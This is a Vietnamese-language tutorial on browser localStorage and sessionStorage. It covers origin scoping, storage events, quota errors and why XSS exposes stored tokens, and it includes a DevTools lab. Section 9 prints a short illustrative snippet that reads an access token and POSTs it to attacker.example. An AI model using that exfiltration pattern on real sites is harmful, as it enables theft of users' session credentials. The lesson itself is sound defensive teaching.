# localStorage: lưu trữ dữ liệu phía trình duyệt và ranh giới bảo mật

## Mục tiêu học tập

Sau bài học, người học có thể:

1. Giải thích Web Storage và cách localStorage lưu dữ liệu theo origin.
2. Phân biệt vòng đời, phạm vi và khả năng chia sẻ dữ liệu của localStorage với sessionStorage.
3. Dùng các phương thức getItem, setItem, removeItem, clear và key an toàn.
4. Hiểu sự kiện storage và cách đồng bộ thay đổi giữa các tab hoặc browsing context.
5. Nhận diện giới hạn đồng bộ, quota, lỗi truy cập và rủi ro cạnh tranh khi nhiều tab cùng ghi.
6. Giải thích vì sao XSS có thể đọc và sửa dữ liệu trong Web Storage.
7. Thiết kế cách lưu preferences và trạng thái UI mà không biến Web Storage thành kho lưu credential.
8. Kiểm thử origin scoping, session lifetime và storage event bằng Chrome DevTools.

> **Bối cảnh:** Module Browser Security phân tích ranh giới bảo mật giữa trình duyệt, origin, cookie và ứng dụng web để hiểu Same-Origin Policy, CORS và các cơ chế cách ly; đồng thời thực hành phòng vệ XSS, CSRF, clickjacking bằng CSP, Trusted Types và security headers. Bài học này tập trung vào Web Storage, đặc biệt là localStorage, sessionStorage, phạm vi origin, đồng bộ và rủi ro XSS.

## 1. Web Storage là gì?

Web Storage là API phía trình duyệt cho phép JavaScript lưu các cặp key/value dạng chuỗi. Hai vùng lưu trữ phổ biến là:

- localStorage: dữ liệu được chia sẻ giữa các document cùng origin trong cùng storage area và thường tồn tại qua nhiều lần đóng/mở browser.
- sessionStorage: dữ liệu được chia sẻ giữa các document cùng origin trong cùng top-level browsing context, thường tương ứng với một tab hoặc cửa sổ trong suốt page session.

Ví dụ lưu tùy chọn giao diện:

    localStorage.setItem("app:theme", "dark");
    const theme = localStorage.getItem("app:theme");

Web Storage phù hợp với preferences, bộ lọc, trạng thái giao diện nhỏ và dữ liệu không nhạy cảm. Nó không phải database có transaction, không phải kho bí mật và không nên dùng để giữ session token dài hạn.

### Web Storage không giống cookie

| Đặc điểm | localStorage/sessionStorage | Cookie |
| --- | --- | --- |
| Đọc từ JavaScript | Có, bởi script cùng origin | Có, trừ cookie HttpOnly |
| Tự gửi theo HTTP request | Không | Có, theo domain/path/SameSite/Secure |
| Dung lượng | Thường lớn hơn cookie nhưng quota do browser quyết định | Nhỏ, giới hạn theo cookie và domain |
| Phạm vi | Origin; sessionStorage còn giới hạn theo top-level browsing context | Domain/host, path và thuộc tính cookie |
| Vòng đời | localStorage thường lâu dài; sessionStorage theo page session | Theo Expires/Max-Age hoặc session cookie |
| Bảo vệ khỏi XSS đọc dữ liệu | Không | HttpOnly ngăn JavaScript đọc cookie |
| CSRF | Không tự gửi theo request nên không tự tạo cùng kiểu CSRF như cookie | Cần SameSite và CSRF defense phù hợp |

Web Storage không tự đính kèm dữ liệu vào request. Ứng dụng phải tự đọc giá trị và quyết định gửi đi. Điều đó giảm một số rủi ro CSRF kiểu cookie tự động, nhưng không làm dữ liệu trong storage an toàn trước XSS.

## 2. Origin scoping: dữ liệu thuộc origin nào?

localStorage được phân vùng theo origin. Origin là bộ ba:

**scheme + host + port**

Ví dụ các URL sau cùng origin:

    https://shop.example.test/
    https://shop.example.test/products
    https://shop.example.test/account/settings

Path không tham gia vào origin. Các trang trên dùng chung localStorage.

Các URL sau là những origin khác nhau:

    http://shop.example.test
    https://shop.example.test
    https://admin.example.test
    https://shop.example.test:8443

Khác scheme, host hoặc port thì storage area khác nhau. Vì vậy:

- HTTP không đọc được localStorage của HTTPS.
- Subdomain admin không đọc được localStorage của shop.
- Dịch vụ chạy ở port 8443 không đọc được storage của port mặc định.
- Cùng origin nhưng khác path vẫn dùng chung storage.

Port mặc định được chuẩn hóa theo scheme. Ví dụ https://shop.example.test và https://shop.example.test:443 là cùng origin theo quy tắc URL; http://shop.example.test và https://shop.example.test vẫn khác nhau.

### localStorage không chia sẻ giữa các subdomain

Giả sử:

    https://app.example.test
    https://api.example.test

Hai host có cùng domain gốc nhưng khác origin. JavaScript ở app.example.test không thể đọc localStorage của api.example.test.

Việc thiết lập document.domain theo cơ chế cũ để nới lỏng một số kiểm tra same-origin không biến localStorage thành vùng lưu trữ dùng chung giữa hai origin.

### CORS không cấp quyền đọc localStorage

CORS cho phép hoặc từ chối JavaScript đọc một số response mạng cross-origin. CORS không cấp quyền truy cập Web Storage của origin khác. Muốn chia sẻ dữ liệu giữa các ứng dụng khác origin, hãy dùng API/backend có xác thực hoặc một protocol trao đổi dữ liệu có kiểm soát như postMessage.

### Lưu ý về storage partitioning

Phạm vi origin là mô hình cơ bản của Web Storage. Browser hiện đại còn có thể partition hoặc hạn chế storage trong third-party context theo top-level site và chính sách chống tracking. Vì vậy, iframe bên thứ ba không nên giả định localStorage của nó luôn được chia sẻ giống nhau khi nhúng dưới các website cha khác nhau.

Không dùng storage bên thứ ba làm kênh đồng bộ liên website nếu chưa kiểm tra browser và chính sách privacy thực tế.

## 3. Các phương thức của localStorage

localStorage và sessionStorage đều triển khai giao diện Storage với các thuộc tính/phương thức chính:

| API | Tác dụng |
| --- | --- |
| setItem(key, value) | Ghi một cặp key/value |
| getItem(key) | Đọc giá trị; trả null nếu key chưa tồn tại |
| removeItem(key) | Xóa một key |
| clear() | Xóa toàn bộ key trong storage area hiện tại |
| key(index) | Lấy tên key tại vị trí index |
| length | Số key đang lưu |

Ví dụ:

    localStorage.setItem("app:theme", "dark");
    localStorage.setItem("app:sidebar", "collapsed");

    const theme = localStorage.getItem("app:theme");
    console.log(theme); // "dark"

    localStorage.removeItem("app:sidebar");

    console.log(localStorage.length);
    console.log(localStorage.key(0));

### Giá trị luôn là chuỗi

Web Storage lưu key và value dạng chuỗi. Nếu truyền object trực tiếp:

    localStorage.setItem("profile", { name: "An" });

JavaScript sẽ chuyển object thành chuỗi thông thường như [object Object], không phải JSON. Hãy serialize rõ ràng:

    const preferences = {
      theme: "dark",
      compactMode: true
    };

    localStorage.setItem(
      "app:preferences",
      JSON.stringify(preferences)
    );

    const raw = localStorage.getItem("app:preferences");
    const restored = raw === null ? null : JSON.parse(raw);

Không gọi JSON.parse mà không xử lý lỗi: dữ liệu có thể cũ, bị cắt, bị sửa bằng DevTools hoặc do phiên bản ứng dụng khác ghi.

### Nên đặt namespace cho key

Thay vì key chung chung:

    theme
    user
    settings

nên dùng tên có namespace và version:

    shop:v1:preferences
    shop:v1:cart-view
    shop:v1:last-filter

Namespace giảm va chạm khi nhiều ứng dụng cùng origin. Nếu nhiều ứng dụng dùng chung host, hãy thống nhất ownership; localStorage không có namespace tự động theo path hoặc frontend bundle.

## 4. localStorage và sessionStorage khác nhau thế nào?

| Đặc điểm | localStorage | sessionStorage |
| --- | --- | --- |
| Phạm vi cơ bản | Origin | Origin + top-level browsing context |
| Chia sẻ giữa tab độc lập | Có, nếu cùng origin và cùng storage area | Không |
| Reload trang | Dữ liệu còn | Dữ liệu còn |
| Đóng tab/cửa sổ | Dữ liệu thường còn | Page session kết thúc khi tab/cửa sổ đóng |
| Mở tab mới | Cùng origin đọc storage area chung | Có vùng session riêng |
| Sự kiện storage | Có thể thông báo các document khác cùng storage area | Chỉ các document cùng origin trong cùng top-level context |
| Mục đích thường gặp | Preferences và trạng thái không nhạy cảm lâu dài | Trạng thái tạm trong một tab/flow |

### sessionStorage được phân vùng theo tab

Hai tab độc lập mở cùng URL thường có sessionStorage riêng:

    Tab A: sessionStorage["step"] = "payment"
    Tab B: sessionStorage["step"] = "shipping"

Thay đổi ở Tab A không ghi đè vùng sessionStorage của Tab B.

Một ngoại lệ cần biết: khi một browsing context mới được mở với opener, sessionStorage ban đầu có thể được khởi tạo bằng bản sao trạng thái của opener tại thời điểm tạo. Sau đó hai vùng tách biệt; thay đổi tiếp theo ở một bên không tự đồng bộ sang bên kia. Không dùng hành vi khởi tạo này làm cơ chế chia sẻ dữ liệu quan trọng.

### sessionStorage không phải vùng bí mật

sessionStorage có thời gian sống ngắn hơn localStorage, nhưng JavaScript chạy cùng origin vẫn đọc và sửa được. XSS có thể đánh cắp dữ liệu trong sessionStorage trong lúc tab tồn tại.

Không lưu access token, refresh token hoặc credential nhạy cảm vào sessionStorage chỉ vì nó tự xóa khi đóng tab.

## 5. Vòng đời và độ bền dữ liệu

### localStorage

localStorage thường tồn tại qua:

- Reload trang.
- Điều hướng sang trang khác cùng origin.
- Đóng rồi mở lại tab.
- Đóng rồi khởi động lại browser.

Nhưng không nên coi đây là cam kết lưu trữ vĩnh viễn. Dữ liệu có thể mất khi:

- Người dùng xóa dữ liệu website/browser.
- Người dùng duyệt ở chế độ private/incognito và kết thúc phiên private.
- Browser hoặc chính sách thiết bị chặn storage.
- Browser thu hồi dữ liệu theo quota hoặc điều kiện quản lý storage.
- Ứng dụng chủ động xóa hoặc migrate dữ liệu.

### sessionStorage

sessionStorage tồn tại trong page session của tab/cửa sổ:

- Reload và restore trang trong cùng page session thường giữ dữ liệu.
- Điều hướng trong cùng tab vẫn giữ vùng sessionStorage của origin tương ứng.
- Tab mới có session riêng.
- Đóng tab/cửa sổ kết thúc page session theo hành vi thông thường.

Khôi phục session của browser có thể khôi phục tab và trạng thái liên quan; không thiết kế logic bảo mật dựa vào giả định rằng mọi lần đóng/mở tab đều xóa dữ liệu tuyệt đối.

## 6. Storage event: đồng bộ giữa các tab

Khi một document thay đổi localStorage, các document khác đang dùng cùng storage area có thể nhận sự kiện storage:

    window.addEventListener("storage", (event) => {
      console.log("key:", event.key);
      console.log("old:", event.oldValue);
      console.log("new:", event.newValue);
      console.log("url:", event.url);
    });

Điểm quan trọng:

- Sự kiện được gửi tới document khác, không gửi về document đã thực hiện thao tác ghi.
- Với localStorage, các tab/document cùng origin và cùng storage area có thể nhận event.
- Với sessionStorage, event chỉ được gửi tới document cùng origin trong cùng top-level browsing context, chẳng hạn iframe cùng tab; tab độc lập không nhận event.
- Event được xử lý bất đồng bộ, không phải lời gọi hàm đồng bộ tới tab kia.

### Các thuộc tính của StorageEvent

| Thuộc tính | Ý nghĩa |
| --- | --- |
| key | Key bị thay đổi; null khi clear() |
| oldValue | Giá trị trước thay đổi; null nếu key chưa tồn tại |
| newValue | Giá trị mới; null khi removeItem() hoặc clear() |
| url | URL của document thực hiện thay đổi |
| storageArea | Storage object bị thay đổi, thường là localStorage hoặc sessionStorage |

Ví dụ cập nhật giao diện khi tab khác đổi theme:

    window.addEventListener("storage", (event) => {
      if (event.storageArea !== localStorage) return;
      if (event.key !== "shop:v1:preferences") return;

      const preferences = parsePreferences(event.newValue);
      if (!preferences) return;

      applyTheme(preferences.theme);
    });

Trong code production, hãy xử lý trường hợp storage không truy cập được và validate dữ liệu trước khi dùng. Không tin event payload chỉ vì nó đến từ một tab cùng origin.

### Khi nào storage event không xuất hiện?

- Document tự ghi không nhận event cho chính thao tác của nó.
- setItem với giá trị không đổi có thể không tạo event.
- removeItem với key không tồn tại không tạo thay đổi.
- clear() khi storage đã rỗng không có thay đổi để thông báo.
- Tab đã đóng hoặc document không còn hoạt động sẽ không xử lý event.

### Đồng bộ không có nghĩa là transaction

Storage event giúp các tab biết dữ liệu đã đổi. Nó không cung cấp transaction, lock hoặc bảo đảm thứ tự nghiệp vụ giữa nhiều thao tác.

Ví dụ hai tab cùng tăng counter:

    const current = Number(localStorage.getItem("counter") || "0");
    localStorage.setItem("counter", String(current + 1));

Nếu hai tab cùng đọc giá trị 4 trước khi tab nào ghi, cả hai có thể ghi 5. Một lần tăng bị mất. Đây là race condition kiểu read-modify-write.

Không dùng localStorage làm bộ đếm tài chính, inventory, sequence hoặc dữ liệu cần tính nhất quán. Dùng backend hoặc IndexedDB transaction phù hợp.

## 7. localStorage là API đồng bộ

Các thao tác getItem, setItem, removeItem và clear là synchronous. JavaScript phải chờ thao tác hoàn tất trước khi chạy câu lệnh tiếp theo.

Với lượng dữ liệu nhỏ, thao tác thường nhanh. Nhưng đọc/ghi nhiều key hoặc chuỗi lớn trong luồng chính có thể làm giao diện khựng, đặc biệt trên thiết bị yếu.

Khuyến nghị:

- Chỉ lưu dữ liệu nhỏ, cần truy cập đơn giản.
- Không lưu blob, video, ảnh hoặc cache lớn trong localStorage.
- Không đọc/ghi lặp lại trong animation frame hoặc vòng lặp render.
- Cache giá trị đã parse trong memory khi phù hợp.
- Dùng IndexedDB cho dữ liệu lớn, cấu trúc phức tạp hoặc thao tác bất đồng bộ/transaction.

localStorage không có transaction nhiều bước. Nếu cần cập nhật nhiều record nhất quán, chọn storage có transaction thay vì tự xây lock bằng key.

## 8. Quota và lỗi truy cập

Dung lượng Web Storage phụ thuộc browser, profile, chính sách privacy và môi trường. Không giả định có một quota cố định cho mọi trình duyệt.

Các tình huống có thể gặp:

- Truy cập window.localStorage ném SecurityError.
- setItem ném QuotaExceededError khi vượt quota hoặc browser không cho ghi.
- Private browsing hoặc policy của tổ chức giới hạn khả năng lưu.
- Origin không phải tuple thông thường, ví dụ một số opaque origin, không có localStorage dùng được.
- Tài nguyên file: có hành vi không được chuẩn hóa đồng nhất; không dựa vào localStorage trên file URL.

### Bọc thao tác storage trong try/catch

Ngay cả lúc đọc property localStorage, browser cũng có thể ném lỗi trong một số môi trường. Hãy lấy storage một cách phòng thủ:

    function getLocalStorage() {
      try {
        return window.localStorage;
      } catch (error) {
        return null;
      }
    }

Ghi dữ liệu:

    function savePreference(key, value) {
      const storage = getLocalStorage();
      if (!storage) return false;

      try {
        storage.setItem(key, value);
        return true;
      } catch (error) {
        if (error.name === "QuotaExceededError") {
          console.warn("Không đủ quota để lưu preference");
        }
        return false;
      }
    }

Không để lỗi storage làm hỏng toàn bộ ứng dụng. Với dữ liệu preference, có thể fallback về giá trị mặc định trong memory.

## 9. Rủi ro XSS: mọi script cùng origin có thể đọc storage

Đây là rủi ro bảo mật quan trọng nhất của localStorage và sessionStorage.

Nếu trang có XSS, attacker có thể chạy JavaScript trong origin của ứng dụng. Code đó có thể đọc:

    const token = localStorage.getItem("access-token");

và gửi dữ liệu ra ngoài:

    fetch("https://attacker.example/collect", {
      method: "POST",
      body: token
    });

Đoạn code chỉ minh họa rủi ro. Khi attacker thực thi JavaScript trong origin, same-origin policy không ngăn script đó đọc Web Storage của origin ấy.

### Vì sao HttpOnly cookie khác localStorage?

JavaScript không thể đọc cookie có thuộc tính HttpOnly qua document.cookie. Vì vậy, HttpOnly giúp giảm nguy cơ attacker lấy trực tiếp session identifier từ XSS.

Tuy nhiên:

- XSS vẫn có thể thực hiện hành động thay người dùng trong trang đang bị kiểm soát.
- Cookie tự gửi theo request nên cần SameSite và CSRF defense phù hợp.
- HttpOnly không sửa được lỗi XSS; nó chỉ giảm một số hậu quả của việc đọc credential.

Với ứng dụng web có backend, cân nhắc session cookie được cấu hình Secure, HttpOnly, SameSite phù hợp và bảo vệ CSRF. Mô hình Backend-for-Frontend (BFF) có thể giữ access/refresh token ở server thay vì đưa chúng vào JavaScript.

### Không lưu credential dài hạn trong Web Storage

Tránh lưu:

- Password.
- Session ID hoặc bearer token.
- Access token dài hạn.
- Refresh token.
- API key có quyền cao.
- Thông tin thanh toán hoặc dữ liệu cá nhân nhạy cảm.

Việc mã hóa token trước khi ghi localStorage thường không giải quyết được XSS nếu khóa giải mã cũng có thể được JavaScript của trang truy cập. Base64 cũng chỉ là encoding, không phải encryption.

sessionStorage có vòng đời ngắn hơn nhưng vẫn đọc được bởi XSS. Không xem nó là kho credential an toàn.

## 10. Dữ liệu trong storage luôn phải được xem là không tin cậy

Người dùng có thể sửa localStorage bằng DevTools. Script khác cùng origin, extension hoặc XSS cũng có thể sửa dữ liệu. Vì vậy, không dùng giá trị storage làm bằng chứng authorization.

Ví dụ sai:

    if (localStorage.getItem("isAdmin") === "true") {
      showAdminPanel();
    }

Ẩn nút quản trị phía client không tạo quyền quản trị. Backend phải kiểm tra quyền trên từng request.

### Validate dữ liệu khi đọc

Ví dụ chỉ chấp nhận theme trong allowlist:

    function parseTheme(raw) {
      if (raw !== "light" && raw !== "dark") {
        return "light";
      }
      return raw;
    }

Với JSON, kiểm tra cấu trúc và giới hạn:

    function parsePreferences(raw) {
      if (typeof raw !== "string" || raw.length > 4096) {
        return null;
      }

      try {
        const value = JSON.parse(raw);
        if (!value || typeof value !== "object" || Array.isArray(value)) {
          return null;
        }

        const theme = value.theme === "dark" ? "dark" : "light";
        const compactMode = value.compactMode === true;

        return { theme, compactMode };
      } catch {
        return null;
      }
    }

Không đưa chuỗi đọc từ storage vào innerHTML, eval hoặc Function. Nếu cần hiển thị text, dùng textContent. Nếu cần tạo HTML, dùng template tĩnh và DOM API an toàn hoặc sanitizer phù hợp.

### JSON không phải lớp bảo mật

JSON.stringify/parse chỉ chuyển đổi dữ liệu. Nó không xác thực nguồn, không mã hóa, không ngăn XSS và không bảo đảm dữ liệu đúng schema.

## 11. Thiết kế key, migration và logout

### Dùng version trong key hoặc payload

Khi schema thay đổi, có thể lưu version:

    {
      "version": 2,
      "theme": "dark",
      "compactMode": true
    }

Khi đọc:

1. Parse JSON trong try/catch.
2. Kiểm tra version được hỗ trợ.
3. Validate field và giới hạn kích thước.
4. Migrate dữ liệu cũ nếu migration an toàn.
5. Nếu dữ liệu lỗi, xóa đúng key do ứng dụng sở hữu và dùng default.

Không gọi clear() tùy tiện nếu nhiều ứng dụng hoặc micro-frontend cùng dùng một origin. clear() xóa toàn bộ storage area của origin đó.

### Xóa dữ liệu khi logout

Nếu ứng dụng lưu preferences hoặc cache gắn với người dùng, logout nên xóa các key user-scoped:

    localStorage.removeItem("shop:v1:user-preferences");
    sessionStorage.removeItem("shop:v1:checkout-draft");

Nếu dùng cookie/session phía server, logout cũng phải revoke hoặc kết thúc session ở backend. Xóa một key trong browser không tự hủy session trên server.

Các tab khác có thể nhận storage event để cập nhật giao diện hoặc chuyển về màn hình đăng nhập. Đây là đồng bộ UI; server vẫn là nguồn xác nhận session đã hết hiệu lực.

### Tránh lưu dữ liệu của user trước cho user sau

Trên thiết bị dùng chung:

- Xóa cache và dữ liệu cá nhân khi logout.
- Namespace dữ liệu theo user ID nếu thực sự cần giữ cache, nhưng không dùng ID làm biện pháp phân quyền.
- Không hiển thị dữ liệu cũ trước khi xác minh session hiện tại.
- Cẩn thận với tab cũ vẫn mở sau khi tài khoản đổi.

## 12. Đồng bộ giữa tab: storage event và BroadcastChannel

localStorage phù hợp với đồng bộ đơn giản, ít tần suất. Ví dụ tab khác thay đổi theme:

    window.addEventListener("storage", (event) => {
      if (event.key !== "shop:v1:theme") return;
      const theme = event.newValue === "dark" ? "dark" : "light";
      applyTheme(theme);
    });

Nếu cần trao đổi message thường xuyên, payload có cấu trúc hoặc không muốn ghi dữ liệu vào storage, cân nhắc BroadcastChannel:

    const channel = new BroadcastChannel("shop-ui");

    channel.postMessage({
      type: "theme-changed",
      theme: "dark"
    });

    channel.addEventListener("message", (event) => {
      if (event.data?.type !== "theme-changed") return;
      if (event.data.theme !== "light" && event.data.theme !== "dark") return;
      applyTheme(event.data.theme);
    });

BroadcastChannel cũng chỉ là kênh giao tiếp giữa các context được phép kết nối theo quy tắc origin/storage partition của browser. Nó không phải kênh xác thực và payload vẫn cần validate.

Đóng channel khi không còn sử dụng:

    channel.close();

Không dùng storage event hoặc BroadcastChannel làm nguồn sự thật cho quyền truy cập, số dư, trạng thái thanh toán hay session server.

## 13. Thực hành bằng Chrome DevTools

Thực hiện trên một ứng dụng local/staging do bạn kiểm soát. Không đưa token thật hoặc dữ liệu cá nhân vào lab.

### Bước 1 — Quan sát localStorage

1. Mở trang HTTPS của ứng dụng.
2. DevTools → Application → Storage → Local Storage.
3. Chọn origin hiện tại.
4. Thêm key test và quan sát giá trị.
5. Reload trang và xác nhận key còn tồn tại.

Trong Console:

    localStorage.setItem("lab:message", "hello");
    localStorage.getItem("lab:message");

### Bước 2 — Kiểm tra origin scoping

1. Mở cùng host ở một path khác.
2. Xác nhận key vẫn đọc được.
3. Mở subdomain khác hoặc port khác.
4. Xác nhận storage area khác.
5. Thử HTTP và HTTPS trong môi trường test; xác nhận scheme khác nhau tạo storage area khác.

Không thay đổi dữ liệu của website production khi làm bài thực hành.

### Bước 3 — So sánh sessionStorage

1. Trong Tab A, ghi sessionStorage key lab:tab.
2. Reload Tab A và xác nhận key còn.
3. Mở URL cùng origin trong Tab B độc lập.
4. Xác nhận Tab B không có key đó.
5. Đóng Tab A và mở tab mới; xác nhận page session cũ không còn theo hành vi thông thường.

### Bước 4 — Quan sát storage event

Trong hai tab cùng origin, chạy listener ở Tab B:

    window.addEventListener("storage", (event) => {
      console.log(event.key, event.oldValue, event.newValue, event.url);
    });

Ở Tab A:

    localStorage.setItem("lab:sync", "updated");

Tab B nhận event; Tab A không nhận event cho thao tác do chính nó thực hiện.

Thử removeItem và clear trong một origin lab riêng để quan sát newValue/key.

### Bước 5 — Quan sát rủi ro XSS

Không chạy payload đánh cắp dữ liệu. Chỉ kiểm tra quyền đọc trong trang lab:

    localStorage.setItem("lab:visible", "not-a-secret");
    console.log(localStorage.getItem("lab:visible"));

Quan sát rằng script của trang có thể đọc giá trị. Đây là lý do không lưu credential hoặc bí mật trong Web Storage.

### Ma trận kiểm thử

| Ca kiểm thử | Thiết lập | Kết quả mong đợi |
| --- | --- | --- |
| Cùng origin, khác path | Hai URL cùng scheme/host/port | Dùng chung localStorage |
| Khác scheme | HTTP và HTTPS | Storage area khác |
| Khác host | app và admin subdomain | Storage area khác |
| Khác port | Cùng host, port khác | Storage area khác |
| Hai tab localStorage | Cùng origin | Thấy dữ liệu chung; tab còn lại nhận storage event |
| Hai tab sessionStorage | Cùng origin, tab độc lập | Storage area riêng |
| Reload sessionStorage | Cùng tab | Dữ liệu thường còn |
| Đóng tab | Kết thúc page session | sessionStorage không còn trong tab mới |
| Storage bị chặn | Browser policy/private mode phù hợp | Truy cập hoặc ghi có thể ném lỗi |
| Quota exceeded | Ghi lượng dữ liệu quá lớn trong lab | Bắt lỗi và fallback an toàn |
| Dữ liệu JSON hỏng | Ghi chuỗi JSON không hợp lệ | Parser từ chối, ứng dụng dùng default |
| XSS trong origin | Script lab đọc một key test | Script cùng origin có thể đọc storage |

## 14. Sai lầm thường gặp

| Sai lầm | Hậu quả | Cách sửa |
| --- | --- | --- |
| Nghĩ localStorage chia sẻ giữa subdomain | Đọc nhầm ranh giới origin | Nhớ origin gồm scheme, host và port |
| Dùng localStorage để lưu session token | XSS có thể đọc và gửi token ra ngoài | Dùng session architecture phù hợp, cân nhắc HttpOnly cookie/BFF |
| Nghĩ sessionStorage an toàn hơn trước XSS | Script cùng origin vẫn đọc được | Không lưu credential nhạy cảm ở cả hai vùng |
| Lưu object trực tiếp | Giá trị bị chuyển thành chuỗi không hữu ích | Dùng JSON.stringify/parse và validate |
| JSON.parse không try/catch | Dữ liệu lỗi làm crash luồng ứng dụng | Xử lý parse error và default |
| Tin isAdmin trong storage | Người dùng có thể sửa bằng DevTools | Authorization phải do backend quyết định |
| Dùng clear() trên origin dùng chung | Xóa dữ liệu của ứng dụng khác | Chỉ xóa key có namespace/ownership |
| Coi storage event là transaction | Race condition và lost update | Dùng backend hoặc IndexedDB transaction |
| Ghi dữ liệu lớn liên tục | Chặn main thread và làm UI giật | Dùng IndexedDB hoặc cache phù hợp |
| Không bắt QuotaExceededError | Lỗi lưu trữ lan ra UI | Bọc truy cập và ghi trong try/catch |
| Dùng storage cho dữ liệu cross-origin | Bị chặn bởi origin boundary | Dùng API có xác thực hoặc message protocol |
| Tin dữ liệu storage là HTML an toàn | DOM XSS | Validate và dùng textContent/sanitizer |

## 15. Câu hỏi củng cố

**Câu 1.** localStorage được chia sẻ theo path hay origin?

**Giải đáp:** Theo origin gồm scheme, host và port. Các path khác nhau nhưng cùng origin dùng chung storage area.

**Câu 2.** Vì sao https://app.example.test không đọc được localStorage của https://admin.example.test?

**Giải đáp:** Host khác nhau nên hai URL là hai origin khác nhau. Same-Origin Policy ngăn truy cập storage của origin kia.

**Câu 3.** sessionStorage khác localStorage thế nào?

**Giải đáp:** sessionStorage được phân vùng theo origin và top-level browsing context, thường là từng tab/page session; localStorage được chia sẻ giữa các document cùng origin trong cùng storage area và thường tồn tại qua lần mở browser.

**Câu 4.** Tab ghi localStorage có nhận storage event cho chính thao tác đó không?

**Giải đáp:** Không. Event được gửi tới document khác đang dùng cùng storage area.

**Câu 5.** Vì sao không nên lưu refresh token trong localStorage?

**Giải đáp:** JavaScript cùng origin có thể đọc giá trị. Nếu xảy ra XSS, attacker có thể lấy token và sử dụng ngoài trình duyệt. sessionStorage cũng không loại bỏ rủi ro XSS.

**Câu 6.** localStorage có bảo đảm transaction khi hai tab cùng tăng counter không?

**Giải đáp:** Không. Chuỗi đọc-sửa-ghi có thể race và làm mất cập nhật. Dùng storage có transaction hoặc backend cho dữ liệu cần nhất quán.

**Câu 7.** JSON.stringify có làm dữ liệu trong storage an toàn không?

**Giải đáp:** Không. Nó chỉ serialize dữ liệu. Vẫn phải validate khi đọc và tránh đưa chuỗi không tin cậy vào HTML/code.

## 16. Tổng kết

localStorage lưu cặp key/value dạng chuỗi theo origin và thường tồn tại qua nhiều lần mở trang. sessionStorage cũng theo origin nhưng còn gắn với top-level browsing context, thường là một tab/page session. localStorage có thể hỗ trợ đồng bộ giữa các tab qua storage event; event không gửi về document đã ghi và không cung cấp transaction.

Web Storage là API đồng bộ, có quota và có thể bị chặn bởi browser policy. Hãy dùng nó cho dữ liệu nhỏ, không nhạy cảm như preferences; validate mọi dữ liệu khi đọc, bắt lỗi truy cập và tránh clear toàn bộ storage của origin dùng chung.

Điểm bảo mật quan trọng nhất: bất kỳ JavaScript nào chạy cùng origin, kể cả script do XSS chèn vào, đều có thể đọc và sửa Web Storage. Không lưu password, session ID, access token hoặc refresh token ở localStorage/sessionStorage. Dùng server-side authorization, bảo vệ XSS và chọn session architecture phù hợp; HttpOnly cookie/BFF có thể giảm khả năng đánh cắp credential trực tiếp nhưng vẫn cần CSRF defense và phòng XSS.

## Tài liệu tham khảo

1. [WHATWG — HTML Standard: Web storage](https://html.spec.whatwg.org/multipage/webstorage.html): đặc tả Storage, localStorage, sessionStorage và storage event.
2. [MDN — Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API): khái niệm, phương thức và sự kiện storage.
3. [MDN — Window.localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage): origin scoping, vòng đời và ngoại lệ truy cập.
4. [MDN — Window.sessionStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage): page session, tab scoping và hành vi opener.
5. [MDN — StorageEvent](https://developer.mozilla.org/en-US/docs/Web/API/StorageEvent): thuộc tính event và cách đồng bộ document.
6. [OWASP — HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html): rủi ro lưu session identifier và dữ liệu nhạy cảm trong browser storage.
